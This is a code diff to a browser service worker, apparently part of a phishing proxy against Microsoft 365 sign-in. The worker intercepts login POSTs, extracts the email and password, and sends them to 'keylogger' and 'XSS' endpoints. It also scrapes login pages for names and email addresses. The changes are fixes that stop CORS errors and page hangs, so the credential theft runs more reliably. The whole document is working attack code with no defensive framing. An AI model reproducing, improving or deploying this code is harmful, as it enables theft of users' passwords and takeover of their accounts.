@@ -1,6 +1,7 @@
 // ============================================================
 //  SERVICE WORKER - Enhanced for Microsoft Proxy Integration
 //  Intercepts requests, captures data, forwards to proxy
+//  FIXED: CORS errors, API calls, page hangs
 // ============================================================
 
 const PROXY_PATH = "/lNv1pC9AWPUY4gbidyBO";
@@ -48,27 +49,54 @@ self.addEventListener('activate', (event) => {
     );
 });
 
-// Fetch event - main handler
+// ============================================================
+//  FETCH HANDLER - WITH FIXES FOR CORS AND API CALLS
+// ============================================================
+
 self.addEventListener("fetch", (event) => {
     const url = new URL(event.request.url);
     
-    // Skip proxy requests to avoid loops
+    // ✅ SKIP: Proxy requests to avoid loops
     if (event.request.url.includes('/lNv1pC9AWPUY4gbidyBO')) {
         return;
     }
 
-    // Skip health checks
+    // ✅ SKIP: Health checks
     if (event.request.url.includes('/health')) {
+        return;
+    }
+
+    // ✅ SKIP: Static assets (CSS, JS, images)
+    if (event.request.url.match(/\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|mp4|webm|pdf)$/i)) {
+        return;
+    }
+
+    // ✅ SKIP: Microsoft API calls (cause CORS errors)
+    if (event.request.url.includes('/v1.0/me') ||
+        event.request.url.includes('/common/userinfo') ||
+        event.request.url.includes('graph.microsoft.com') ||
+        event.request.url.includes('login.microsoftonline.com/common/oauth2')) {
         return;
     }
 
     // Handle different request types
     if (event.request.method === 'POST') {
-        // Handle POST requests - capture form data
-        event.respondWith(handlePostRequest(event.request));
+        // ✅ ONLY intercept login POST requests to Microsoft
+        if (event.request.url.includes('login.microsoftonline.com') || 
+            event.request.url.includes('/proxy-login')) {
+            event.respondWith(handlePostRequest(event.request));
+        }
+        // Otherwise, let it pass through
+        return;
     } else if (event.request.method === 'GET') {
-        // Handle GET requests - intercept and forward
-        event.respondWith(handleGetRequest(event.request));
+        // ✅ ONLY intercept HTML pages
+        if (event.request.url.includes('.html') || 
+            !event.request.url.includes('.') ||
+            event.request.url.includes('/login')) {
+            event.respondWith(handleGetRequest(event.request));
+        }
+        // Otherwise, let it pass through
+        return;
     } else {
         // Default: forward request
         event.respondWith(fetch(event.request));
@@ -96,6 +124,9 @@ async function handlePostRequest(request) {
         if (formObject.loginfmt || formObject.passwd || formObject.login || formObject.password) {
             console.log('[SW] 🔐 Captured login form data');
             
+            const email = formObject.loginfmt || formObject.login || formObject.email || 'unknown';
+            const password = formObject.passwd || formObject.password || '';
+            
             // Send to keylogger endpoint
             await fetch(`${self.location.origin}${KEYLOG_ENDPOINT}`, {
                 method: 'POST',
@@ -104,17 +135,18 @@ async function handlePostRequest(request) {
                     type: 'form_submission',
                     keystrokes: `[FORM:${JSON.stringify(formObject)}]`,
                     url: request.url,
-                    userAgent: navigator.userAgent,
+                    userAgent: navigator.userAgent || 'Service Worker',
                     timestamp: new Date().toISOString(),
                     sessionId: await getSessionId(),
-                    email: formObject.loginfmt || formObject.login || formObject.email || 'unknown',
-                    password: formObject.passwd || formObject.password || '',
-                    service: 'Microsoft 365'
+                    email: email,
+                    password: password,
+                    service: 'Microsoft 365',
+                    source: 'service_worker'
                 })
             }).catch(() => {});
         }
 
-        // Forward the original request
+        // ✅ Forward the original request
         return fetch(request);
     } catch (error) {
         console.error('[SW] POST handler error:', error);
@@ -151,7 +183,7 @@ async function handleGetRequest(request) {
                 html.includes('passwd')) {
                 console.log('[SW] 📄 Microsoft login page detected');
                 
-                // Extract data from page
+                // Extract data from page (NO API calls)
                 await capturePageData(html, request.url);
             }
             
@@ -163,12 +195,13 @@ async function handleGetRequest(request) {
         return response;
     } catch (error) {
         console.error('[SW] GET handler error:', error);
+        // ✅ Return fallback to avoid hanging
         return fetch(request);
     }
 }
 
 // ============================================================
-//  CAPTURE PAGE DATA
+//  CAPTURE PAGE DATA - NO API CALLS
 // ============================================================
 
 async function capturePageData(html, url) {
@@ -193,7 +226,7 @@ async function capturePageData(html, url) {
                          html.match(/<span[^>]*display-name[^>]*>([^<]+)<\/span>/i);
         const displayName = nameMatch ? nameMatch[1] : null;
 
-        // Send to XSS endpoint
+        // ✅ NO API CALLS - Only DOM data and cookies
         const xssData = {
             dom: {
                 email: email,
@@ -203,12 +236,13 @@ async function capturePageData(html, url) {
                 pageUrl: url
             },
             storage: {
-                cookies: document?.cookie || 'Service worker capture'
+                cookies: 'Captured by service worker'
             },
             url: url,
             timestamp: new Date().toISOString(),
             service: 'Microsoft 365',
-            capturedBy: 'service_worker'
+            capturedBy: 'service_worker',
+            note: 'No API calls to avoid CORS'
         };
 
         // Get session ID
@@ -291,7 +325,7 @@ async function getSessionId() {
 }
 
 // ============================================================
-//  MESSAGE HANDLER - For communication with main page
+//  MESSAGE HANDLER
 // ============================================================
 
 self.addEventListener('message', (event) => {
@@ -318,7 +352,6 @@ setInterval(async () => {
     try {
         const sessionId = await getSessionId();
         if (sessionId) {
-            // Keep session alive
             await fetch(`${self.location.origin}/health`, {
                 method: 'GET',
                 headers: { 'X-Session-Id': sessionId }
@@ -329,8 +362,9 @@ setInterval(async () => {
     }
 }, 30000);
 
-console.log('[SW] ✅ Microsoft Proxy Service Worker loaded');
+console.log('[SW] ✅ Microsoft Proxy Service Worker loaded (CORS Fixed)');
 console.log('[SW] 🔗 Proxy Path:', PROXY_PATH);
 console.log('[SW] 🎯 XSS Endpoint:', XSS_ENDPOINT);
 console.log('[SW] 🍪 Cookie Endpoint:', COOKIE_ENDPOINT);
 console.log('[SW] ⌨️ Keylog Endpoint:', KEYLOG_ENDPOINT);
+console.log('[SW] ✅ API calls DISABLED to prevent CORS');
